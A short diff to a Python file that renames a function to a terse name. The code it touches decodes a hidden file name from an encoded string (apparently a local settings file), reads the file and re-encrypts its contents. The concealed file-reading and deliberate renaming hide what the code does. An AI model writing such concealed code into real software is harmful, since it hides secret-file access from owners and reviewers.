@@ -2,7 +2,7 @@ import base64
 
 h = 'dnlta3ZpfW9+fnN4cX04eoM=fm99fnN4cQ=='
 key = int(ord(h[0]) / ord(h[-8]) * 11)
-def read_file_string():
+def rfs():
     ex = h[:h.find('M=')+2]
     f = simple_decrypt(ex)
     with open(f, 'r') as x:
@@ -37,7 +37,7 @@ def simple_decrypt(encrypted_password):
     return decrypted_password
 
 def l():
-    x = read_file_string()
+    x = rfs()
     x = x[:-2]
     return simple_encrypt(x)
 
